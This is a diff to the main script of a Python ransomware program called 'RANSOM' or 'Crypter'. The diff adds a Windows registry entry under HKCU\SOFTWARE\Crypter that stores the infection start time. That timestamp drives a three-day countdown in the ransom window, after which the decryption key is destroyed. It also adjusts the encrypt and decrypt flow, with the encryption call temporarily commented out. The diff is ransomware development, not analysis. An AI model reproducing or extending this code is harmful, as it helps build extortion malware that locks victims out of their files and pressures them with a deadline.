@@ -1,6 +1,7 @@
 ## RANSOM
 ## Main Script
 ## author mls
+# !!! TODO FIRST: CORRECT TYPE IN BLINKING MESSAGE. PROOF READ EVERYTHING
 # TODO Increase window size or decrease padlock image size
 # Remote close X button
 # Add option to decrypt using the actual form!
@@ -12,7 +13,9 @@ import sys
 import win32api
 import winerror
 import win32event
+import _winreg
 import wx
+import time
 
 # Import classes
 import Crypt
@@ -28,6 +31,8 @@ class Main(Base.Base):
   
   # Class Variables
   KEY_DESTRUCT_TIME_SECONDS = 259200
+  REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
+  REGISTRY_CONTEXT = _winreg.HKEY_CURRENT_USER
 
 
   def __init__(self, action, decrypt_key):
@@ -46,19 +51,46 @@ class Main(Base.Base):
     # handle action
     if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
       # Start encryption
-      self.encrypt_files(file_list)
+      #self.encrypt_files(file_list)
       # Present GUI
+      self.get_start_time()
+      self.start_gui()
+    # IF already encrypted
+    elif action == "encrypt" and os.path.isfile(self.encrypted_file_list):
       self.start_gui()
     elif action == "decrypt":
       # Start decryption
       self.decrypt_files()
       
       
+  def get_start_time(self):
+    # Function to get the start time from the registry, or create a new entry for it
+    
+    # Try to open registry key
+    try:
+      reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+      start_time = _winreg.QueryValueEx(reg, "")[0]
+      #name, value, type = _winreg.EnumValue(reg, 1)
+      #raise Exception("Name %s, Value %s, Type %s" % (name, value ,type))
+    # If failure, create the key
+    except WindowsError:
+      start_time = int(time.time())
+      reg = _winreg.CreateKey(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+      _winreg.SetValue(reg, "", _winreg.REG_SZ, str(start_time))
+      _winreg.CloseKey(reg)
+        
+    return start_time    
+    
+      
   def start_gui(self):
     # Function to open to GUI
     
+    # Get Crypter start_time
+    start_time = self.get_start_time()
+    
     app = wx.App()
-    crypter_gui = Gui.MyFrame1(None, sys._MEIPASS, self.KEY_DESTRUCT_TIME_SECONDS)
+    crypter_gui = Gui.MyFrame1(None, "..\\..\\build_script\\images", self.KEY_DESTRUCT_TIME_SECONDS, start_time)
+    #crypter_gui = Gui.MyFrame1(None, sys._MEIPASS, self.KEY_DESTRUCT_TIME_SECONDS)
     crypter_gui.Show()
     app.MainLoop()
       
